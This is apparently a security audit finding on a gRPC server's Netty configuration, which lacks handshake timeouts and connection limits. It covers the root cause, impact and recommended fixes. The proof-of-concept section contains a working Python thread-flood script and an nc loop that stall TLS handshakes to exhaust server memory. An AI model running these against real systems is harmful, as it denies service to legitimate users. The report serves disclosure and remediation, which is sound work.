### Title
Missing Handshake Timeout and Connection Limits in `grpcServerConfigurer()` Enable Resource Exhaustion via TLS/HTTP2 Handshake Flooding

### Summary
The `grpcServerConfigurer()` method in `GrpcConfiguration.java` configures the Netty gRPC server with only a per-connection call limit (`maxConcurrentCallsPerConnection=5`) and a custom executor. It sets no explicit handshake timeout, no total connection count limit, no `maxConnectionIdle`, and no `maxConnectionAge`. Because `maxConcurrentCallsPerConnection` only applies to fully established connections (post-handshake), an unprivileged attacker can open an unbounded number of TCP connections and stall each at the TLS/HTTP2 handshake phase, forcing the server to hold per-connection state for up to Netty's default 120-second handshake timeout per connection, with no cap on how many such connections can accumulate simultaneously.

### Finding Description
**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, lines 28–35:
```java
@Bean
ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
        GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
    final var nettyProperties = grpcProperties.getNetty();
    return serverBuilder -> {
        serverBuilder.executor(applicationTaskExecutor);
        serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
    };
}
```

`grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, line 14:
```java
private int maxConcurrentCallsPerConnection = 5;
```

**Root cause:** The `ServerBuilderCustomizer` lambda never calls `serverBuilder.handshakeTimeout(...)`, `serverBuilder.maxConnectionIdle(...)`, `serverBuilder.maxConnectionAge(...)`, or any equivalent connection-count ceiling. A grep across the entire Java codebase confirms zero occurrences of `handshakeTimeout`, `maxConnectionIdle`, `maxConnectionAge`, `maxConnections`, or `keepAliveTime` anywhere in the project.

**Failed assumption:** The developer assumes `maxConcurrentCallsPerConnection` bounds server resource usage. It does not — this limit is enforced only on fully established HTTP/2 connections (after the TLS and HTTP/2 handshakes complete). Connections that are in the handshake phase are tracked by Netty's transport layer independently and are not subject to this limit.

**Exploit flow:**
1. Attacker opens a raw TCP connection to port 5600.
2. Attacker sends a TLS `ClientHello` but never sends the next handshake message (or sends a partial HTTP/2 preface and stalls).
3. Netty allocates per-connection state (SSL engine, buffers, channel pipeline) and waits up to 120 seconds (the Netty default `handshakeTimeout`) before closing the connection.
4. Attacker repeats this in a tight loop from multiple source IPs or using IP spoofing-friendly TCP SYN flooding variants.
5. Because there is no connection count ceiling, thousands of connections accumulate simultaneously, each holding ~50–200 KB of JVM heap (SSL context, Netty channel, pipeline handlers).

**Why existing checks fail:**
- `maxConcurrentCallsPerConnection=5` — only applies post-handshake; irrelevant here.
- No rate limiting, no IP-based connection throttling, no `maxConnections()` call anywhere in the codebase.
- Netty's 120-second default handshake timeout is the only backstop, but at a sustained rate of even 100 new stalled connections/second, over 12,000 connections accumulate before the first one expires.

### Impact Explanation
Each stalled TLS connection consumes a Netty `Channel`, an `SSLEngine` instance, and associated pipeline buffers — roughly 50–200 KB of heap per connection depending on cipher suite and buffer sizing. At 10,000 simultaneous stalled connections this is 500 MB–2 GB of heap pressure, plus CPU cost of SSL context initialization. The `applicationTaskExecutor` thread pool is unaffected (no tasks are dispatched until a call is made), but the Netty I/O event loop threads and the JVM heap are directly impacted. This can cause GC pressure, OOM conditions, or I/O thread starvation that degrades or denies service to legitimate gRPC callers — well exceeding the 30% resource consumption threshold.

### Likelihood Explanation
No authentication or prior relationship is required. Port 5600 is the publicly documented gRPC port. The attack requires only the ability to open TCP connections and withhold data — achievable with standard tools (`hping3`, `openssl s_client`, or a trivial Python script). It is repeatable, automatable, and can be distributed across many source IPs to evade simple IP-based firewall rules. The absence of any connection-count limit in the codebase means there is no server-side defense beyond the OS TCP backlog and the 120-second Netty default.

### Recommendation
In `grpcServerConfigurer()`, add explicit resource bounds to the `NettyServerBuilder`:

```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
    // Add these:
    serverBuilder.handshakeTimeout(10, TimeUnit.SECONDS);
    serverBuilder.maxConnectionIdle(300, TimeUnit.SECONDS);
    serverBuilder.maxConnectionAge(3600, TimeUnit.SECONDS);
    serverBuilder.maxConnectionAgeGrace(60, TimeUnit.SECONDS);
};
```

Expose `handshakeTimeout`, `maxConnectionIdle`, and `maxConnectionAge` as configurable fields in `NettyProperties` (mirroring the existing `maxConcurrentCallsPerConnection` pattern). Additionally, consider adding a total connection limit at the infrastructure level (e.g., Kubernetes `NetworkPolicy`, ingress rate limiting, or a Netty `ChannelGroup`-based connection counter).

### Proof of Concept
**Preconditions:** Network access to the gRPC server on port 5600. No credentials required.

**Steps:**
```python
import socket, ssl, time, threading

TARGET_HOST = "<grpc-server-ip>"
TARGET_PORT = 5600
NUM_CONNECTIONS = 5000

def stall_handshake():
    try:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        raw = socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=5)
        # Wrap but never complete: send ClientHello then read nothing
        conn = ctx.wrap_socket(raw, server_hostname=TARGET_HOST, do_handshake_on_connect=False)
        conn.do_handshake()   # completes TLS but never sends HTTP/2 preface
        time.sleep(200)       # hold open past Netty's 120s default
    except Exception:
        pass

threads = [threading.Thread(target=stall_handshake) for _ in range(NUM_CONNECTIONS)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```

**Alternatively (stall before TLS completes):**
```bash
# Open 1000 TCP connections, send partial ClientHello, never complete
for i in $(seq 1 1000); do
  (echo -ne "\x16\x03\x01\x00\x01\x00" | nc -q 200 $TARGET_HOST $TARGET_PORT &)
done
```

**Expected result:** JVM heap usage and Netty channel count increase proportionally with the number of stalled connections. Monitoring `jvm_memory_used_bytes` or `grpc_server_connections_total` (if exposed) will show sustained elevation. Legitimate gRPC clients experience increased latency or connection refusal as I/O threads and heap are exhausted.